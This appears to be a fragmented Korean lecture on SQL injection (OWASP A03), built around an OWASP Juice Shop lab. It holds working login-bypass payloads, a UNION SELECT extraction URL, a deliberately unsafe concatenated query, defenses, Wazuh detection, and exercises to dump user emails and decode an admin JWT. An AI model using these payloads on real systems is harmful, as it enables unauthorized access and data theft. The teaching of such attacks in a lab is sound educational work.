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OWASP Top 10 (1) - SQL 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SQL의 기본 문법(SELECT, WHERE, UNION)을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 Injection의 원리와 유형을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실제 SQL Injection 공격을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 Injection 방어 기법을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10.20.30.201 | 실습 기지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JuiceShop:3000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OWASP Top 10이란?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A01 | Broken Access Control | Week 06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A02 | Cryptographic Failures | -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A03 | Injection (SQL, XSS 등) | Week 04, 05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A04 | Insecure Design | -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A05 | Security Misconfiguration | Week 07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A06 | Vulnerable Components |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SQL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테이블에서 모든 데이터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* FROM Users;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조건부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* FROM Users WHERE email = 'admin@juice-sh.op';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여러 조건 (AND, OR)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* FROM Users WHERE email = 'admin@juice-sh.op' AND password = '1234';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결과 합치기 (UNION)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id, email FROM Users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UNION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id, name FROM Products;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주석 (뒷부분 무시)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SQL Injection이란?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`email = ''` → 빈 문자열과 비교 (거짓)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`OR 1=1` → 항상 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`--` → SQL 주석, 뒤의 `AND password = '...'` 부분을 무시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입력: email = "admin@juice-sh.op"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쿼리: SELECT * FROM Users WHERE email = 'admin@juice-sh.op' AND password = '...'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SQL Injection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오류를 유발하는 입력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'{"email":"'\''","password":"test"}'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JuiceShop SQL Injection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`admin@juice-sh.op'` → 이메일 지정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`--` → 비밀번호 검증 부분을 주석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틀린 비밀번호로 로그인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'{"email":"admin@juice-sh.op","password":"wrong"}'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SQL Injection 심화: 데이터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UNION SELECT로 테이블 목록 추출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컬럼 수를 맞춰야 하므로 여러 번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"http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--"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 2&gt;/dev/null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SQL Injection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앱용 DB 계정: SELECT, INSERT만 허용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관리자용 DB 계정: 모든 권한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DROP, ALTER 같은 위험한 권한은 웹 앱에 부여하지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사용자 입력이 SQL에 직접 삽입됨 - 위험!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const query = "SELECT * FROM Users WHERE email = '" + userInput + "'";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db.query(query);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JuiceShop에서 탐지: Wazuh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서버에서 Wazuh 알림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cat /var/ossec/logs/alerts/alerts.json | tail -5 | python3 -m json.tool"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OpsClaw로 SQLi 테스트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SQLi 테스트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'{"name":"week04-sqli-test","request_text":"JuiceShop SQLi 취약점 점검","master_mode":"external"}'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"Project ID: $PROJECT_ID"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http://localhost:8000/projects/$PROJECT_ID/plan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JuiceShop 로그인 페이지에서 `' OR 1=1--`로 admin 로그인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획득한 JWT 토큰을 디코딩하여 admin 정보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admin 토큰으로 `/api/Users/` API를 호출하여 전체 사용자 목록 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검색 기능에서 `' OR 1=1--`로 모든 제품 표시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UNION SELECT를 사용하여 데이터 추출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오류 메시지에서 데이터베이스 종류(SQLite)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로그인 API에 SQL Injection을 수행하여 admin으로 로그인하고, 획득한 JWT 토큰의 전체 내용을 디코딩하여 제출하라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검색 API(`/rest/products/search`)에 UNION SELECT를 시도하여, Users 테이블의 이메일 목록을 추출하라 (힌트: 컬럼 수 9개)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"매개변수화된 쿼리"를 사용하면 SQL Injection이 왜 불가능해지는지 자신의 말로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 Injection 공격이 SIEM(Wazuh)에서 어떻게 탐지될 수 있는지 논의하라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 Injection은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생하는 취약점이다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`' OR 1=1--`는 가장 기본적인 SQLi 페이로드로, 인증 우회에 사용된다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SQLi 유형: Error-based, UNION-based, Blind (Boolean/Time-based)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방어: 매개변수화된 쿼리, ORM, 입력 검증, 최소 권한, 에러 메시지 제한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JuiceShop에서 실제 SQLi 공격을 통해 admin 권한을 획득할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